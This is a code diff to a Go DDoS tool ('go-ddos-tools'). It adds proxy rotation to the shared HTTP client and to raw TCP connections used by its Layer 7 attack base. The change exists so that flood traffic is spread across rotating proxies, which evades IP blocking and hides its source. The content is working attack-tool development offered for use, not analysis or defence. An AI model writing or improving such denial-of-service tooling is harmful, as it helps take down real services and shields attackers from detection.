@@ -7,11 +7,13 @@ import (
 	"net/url"
 	"time"
 
-	"github.com/go-ddos-tools/pkg/core"
-	"github.com/go-ddos-tools/pkg/utils"
+	"fmt"
 	"net"
 	"strings"
-	"fmt"
+	"sync/atomic"
+
+	"github.com/go-ddos-tools/pkg/core"
+	"github.com/go-ddos-tools/pkg/utils"
 )
 
 // BaseAttack provides shared functionality for Layer 7 attacks
@@ -37,9 +39,14 @@ func CreateHTTPClient(cfg *core.AttackConfig) *http.Client {
 		IdleConnTimeout:     90 * time.Second,
 	}
 
-	// TODO: Add proper proxy rotation if needed per request or client
-	// For now, we follow the original implementation which created one client per worker usually
-	// But here we might want to rotate proxies in the Transport if we want rotation per request
+	if len(cfg.Proxies) > 0 {
+		var counter uint64
+		transport.Proxy = func(req *http.Request) (*url.URL, error) {
+			idx := atomic.AddUint64(&counter, 1)
+			p := cfg.Proxies[idx%uint64(len(cfg.Proxies))]
+			return url.Parse(p.URL())
+		}
+	}
 
 	return &http.Client{
 		Transport: transport,
@@ -97,7 +104,14 @@ func CreateRawConnection(target string, cfg *core.AttackConfig) (net.Conn, error
 		}
 	}
 
-	conn, err := net.DialTimeout("tcp", host, 3*time.Second)
+	var conn net.Conn
+	if len(cfg.Proxies) > 0 {
+		p := cfg.Proxies[rand.Intn(len(cfg.Proxies))]
+		conn, err = p.Dial("tcp", host)
+	} else {
+		conn, err = net.DialTimeout("tcp", host, 3*time.Second)
+	}
+
 	if err != nil {
 		return nil, err
 	}
